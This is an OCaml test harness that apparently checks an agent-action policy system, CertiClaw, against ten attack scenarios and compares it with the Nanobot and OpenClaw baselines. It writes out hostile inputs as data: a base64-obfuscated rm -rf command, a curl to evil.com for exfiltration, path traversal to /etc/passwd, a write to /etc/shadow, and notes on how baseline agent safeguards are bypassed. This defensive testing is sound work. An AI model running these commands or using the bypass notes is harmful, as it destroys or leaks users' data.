(** CertiClaw Security Comparison Harness

    Runs 10 security-critical scenarios through CertiClaw and reports
    what each baseline system would do for the same task.

    Usage: dune exec eval/comparison.exe *)

open Certiclaw.Types
open Certiclaw.Infer

(* ================================================================== *)
(* Scenario type                                                       *)
(* ================================================================== *)

type baseline_outcome =
  | BAccept
  | BReject   [@warning "-37"]
  | BBypass
  | BConfig
  | BNA

type scenario = {
  id          : string;
  description : string;
  action      : action;
  policy      : policy;
  proof       : proof;
  expected    : check_result;
  nanobot     : baseline_outcome;
  nanobot_why : string;
  openclaw    : baseline_outcome;
  openclaw_why : string;
}

let show_baseline = function
  | BAccept -> "Accept"
  | BReject -> "Reject"
  | BBypass -> "BYPASS"
  | BConfig -> "Config-dep"
  | BNA     -> "N/A"

(* ================================================================== *)
(* Shared policy                                                       *)
(* ================================================================== *)

let policy : policy = {
  readable_paths = ["/home/user/src"];
  writable_paths = ["/home/user/src"; "/tmp"];
  allowed_bins   = ["grep"; "curl"; "find"];
  allowed_hosts  = ["example.com"];
  allowed_mcp    = [("files", "read_file")];
}

let honest_cert ?(approval = None) action =
  let effects = infer_effects action in
  { claimed_effects = effects;
    destructive = is_destructive action;
    approval; explanation = None }

(* ================================================================== *)
(* 10 Scenarios                                                        *)
(* ================================================================== *)

let scenarios : scenario list = [
  (* S1: Benign grep *)
  { id = "S1"; description = "Benign grep search";
    action = GrepRecursive { pattern = "TODO"; root = "/home/user/src";
      output = "/tmp/todos.txt" };
    policy; proof = honest_cert (GrepRecursive { pattern = "TODO";
      root = "/home/user/src"; output = "/tmp/todos.txt" });
    expected = Accepted;
    nanobot = BAccept; nanobot_why = "Deny-list passes (no dangerous pattern)";
    openclaw = BAccept; openclaw_why = "grep in safe-bins allowlist" };

  (* S2: Benign file read *)
  { id = "S2"; description = "Read source file";
    action = ReadFile { path = "/home/user/src/main.ml" };
    policy; proof = honest_cert (ReadFile { path = "/home/user/src/main.ml" });
    expected = Accepted;
    nanobot = BAccept; nanobot_why = "read_file tool, path in workspace";
    openclaw = BAccept; openclaw_why = "read_file tool, tool policy allows" };

  (* S3: Benign curl *)
  { id = "S3"; description = "Download from allowed host";
    action = CurlToFile { url = "https://example.com/data.json";
      host = "example.com"; output = "/tmp/data.json" };
    policy; proof = honest_cert (CurlToFile { url = "https://example.com/data.json";
      host = "example.com"; output = "/tmp/data.json" });
    expected = Accepted;
    nanobot = BAccept; nanobot_why = "SSRF check passes (public host)";
    openclaw = BAccept; openclaw_why = "curl in safe-bins, approval passes" };

  (* S4: Write to /etc/shadow *)
  { id = "S4"; description = "Write to /etc/shadow";
    action = WriteFile { path = "/etc/shadow"; content = "exfiltrated" };
    policy; proof = honest_cert (WriteFile { path = "/etc/shadow";
      content = "exfiltrated" });
    expected = Rejected (UnauthorizedWrite "/etc/shadow");
    nanobot = BConfig;
      nanobot_why = "Only if restrictToWorkspace=true (default=false)";
    openclaw = BConfig;
      openclaw_why = "Only if tools.fs.workspaceOnly=true" };

  (* S5: Base64-obfuscated rm -rf — impossible in typed IR *)
  { id = "S5"; description = "Obfuscated rm -rf (typed IR blocks by construction)";
    action = ReadFile { path = "/dev/null" };
    (* The point: there is no IR variant for eval+base64.
       We represent the closest expressible action. *)
    policy;
    proof = honest_cert (ReadFile { path = "/dev/null" });
    expected = Rejected (UnauthorizedRead "/dev/null");
    nanobot = BBypass;
      nanobot_why = "eval $(echo cm0gLXJmIC8=|base64 -d) bypasses regex deny-list";
    openclaw = BConfig;
      openclaw_why = "Depends on allowlist; eval may be blocked if not in safe-bins" };

  (* S6: Path traversal *)
  { id = "S6"; description = "Path traversal ../../etc/passwd";
    action = ReadFile { path = "/home/user/src/../../../etc/passwd" };
    policy;
    proof = honest_cert
      (ReadFile { path = "/home/user/src/../../../etc/passwd" });
    expected = Rejected
      (PathTraversalBlocked "/home/user/src/../../../etc/passwd");
    nanobot = BConfig;
      nanobot_why = "Path.resolve() + is_under, only if restrictToWorkspace";
    openclaw = BConfig;
      openclaw_why = "path.resolve() + relative(), only if workspaceOnly" };

  (* S7: Forged certificate *)
  { id = "S7"; description = "Forged certificate (hide write effect)";
    action = CurlToFile { url = "https://example.com/f";
      host = "example.com"; output = "/tmp/f" };
    policy;
    proof = { claimed_effects = [ NetTo "example.com" ];
      destructive = false; approval = None; explanation = None };
    expected = Rejected ClaimedEffectsMismatch;
    nanobot = BNA;
      nanobot_why = "No certificate concept; cannot detect effect mismatch";
    openclaw = BNA;
      openclaw_why = "No certificate concept; agent intent not declared" };

  (* S8: Delete without approval *)
  { id = "S8"; description = "Delete files without approval";
    action = RemoveByGlob { root = "/tmp"; suffix = ".log";
      recursive = true };
    policy;
    proof = honest_cert (RemoveByGlob { root = "/tmp"; suffix = ".log";
      recursive = true });
    expected = Rejected MissingDestructiveApproval;
    nanobot = BBypass;
      nanobot_why = "find -delete not in deny-list; executed without approval";
    openclaw = BConfig;
      openclaw_why = "Depends on ExecAsk mode; 'off' executes, 'always' prompts" };

  (* S9: Unauthorized MCP tool *)
  { id = "S9"; description = "Unauthorized MCP delete_file";
    action = McpCall { server = "files"; tool = "delete_file";
      args = {|{"path":"/etc/passwd"}|} };
    policy;
    proof = honest_cert (McpCall { server = "files"; tool = "delete_file";
      args = {|{"path":"/etc/passwd"}|} });
    expected = Rejected (UnauthorizedMcpTool ("files", "delete_file"));
    nanobot = BConfig;
      nanobot_why = "Depends on enabledTools config for MCP server";
    openclaw = BConfig;
      openclaw_why = "Tool policy deny list; delete_file may not be listed" };

  (* S10: Curl to unauthorized host *)
  { id = "S10"; description = "Curl to evil.com (data exfil)";
    action = CurlToFile { url = "https://evil.com/exfil";
      host = "evil.com"; output = "/tmp/payload" };
    policy;
    proof = honest_cert (CurlToFile { url = "https://evil.com/exfil";
      host = "evil.com"; output = "/tmp/payload" });
    expected = Rejected (UnauthorizedHost "evil.com");
    nanobot = BBypass;
      nanobot_why = "SSRF blocks private IPs only; evil.com is public";
    openclaw = BConfig;
      openclaw_why = "Depends on allowlist; curl to public host may be allowed" };
]

(* ================================================================== *)
(* Runner                                                              *)
(* ================================================================== *)

let result_matches expected actual =
  match expected, actual with
  | Accepted, Accepted -> true
  | Rejected e1, Rejected e2 -> e1 = e2
  | _ -> false

let show_result = function
  | Accepted -> "ACCEPT"
  | Rejected e -> "REJECT: " ^ show_check_error e

let () =
  Printf.printf "\n";
  Printf.printf "=== CertiClaw Security Comparison ===\n";
  Printf.printf "=== 10 Scenarios x 3 Systems      ===\n\n";

  Printf.printf "%-5s %-42s %-8s %-11s %-11s %s\n"
    "ID" "Scenario" "CC" "Nanobot" "OpenClaw" "CertiClaw Detail";
  Printf.printf "%s\n" (String.make 110 '-');

  let cc_pass = ref 0 in
  let cc_fail = ref 0 in

  List.iter (fun s ->
    let actual = Certiclaw.Check.check ~policy:s.policy ~proof:s.proof
        ~action:s.action in
    let pass = result_matches s.expected actual in
    if pass then incr cc_pass else incr cc_fail;

    let cc_short = if pass then
      (match actual with Accepted -> "ACCEPT" | Rejected _ -> "REJECT")
    else "FAIL" in

    Printf.printf "%-5s %-42s %-8s %-11s %-11s %s\n"
      s.id s.description cc_short
      (show_baseline s.nanobot)
      (show_baseline s.openclaw)
      (show_result actual)
  ) scenarios;

  Printf.printf "%s\n\n" (String.make 110 '-');

  (* Summary table *)
  Printf.printf "Summary:\n";
  Printf.printf "  CertiClaw:  %d/10 correct\n" !cc_pass;
  Printf.printf "  (Nanobot and OpenClaw outcomes from code analysis)\n\n";

  (* Attack-class analysis *)
  Printf.printf "Attack Classes Comparison:\n\n";
  Printf.printf "%-35s %-12s %-12s %-12s\n"
    "Attack" "CertiClaw" "Nanobot" "OpenClaw";
  Printf.printf "%s\n" (String.make 71 '-');

  let attacks = [
    ("Unauthorized write",        "Reject",   "Config-dep", "Config-dep");
    ("Obfuscated shell command",  "Impossible","BYPASS",     "Config-dep");
    ("Path traversal",            "Reject",   "Config-dep", "Config-dep");
    ("Certificate forgery",       "Reject",   "N/A",        "N/A");
    ("Unapproved destruction",    "Reject",   "BYPASS",     "Config-dep");
    ("Unauthorized MCP tool",     "Reject",   "Config-dep", "Config-dep");
    ("Exfil to public host",      "Reject",   "BYPASS",     "Config-dep");
  ] in
  List.iter (fun (attack, cc, nb, oc) ->
    Printf.printf "%-35s %-12s %-12s %-12s\n" attack cc nb oc
  ) attacks;

  Printf.printf "\n";
  Printf.printf "Legend: Reject=always blocked, Config-dep=requires optional flag,\n";
  Printf.printf "        BYPASS=security check is defeated, N/A=concept doesn't exist,\n";
  Printf.printf "        Impossible=attack class eliminated by typed IR\n\n";

  if !cc_fail > 0 then begin
    Printf.printf "FAILURES:\n";
    List.iter (fun s ->
      let actual = Certiclaw.Check.check ~policy:s.policy ~proof:s.proof
          ~action:s.action in
      if not (result_matches s.expected actual) then
        Printf.printf "  %s: expected %s, got %s\n"
          s.id (show_result s.expected) (show_result actual)
    ) scenarios;
    exit 1
  end
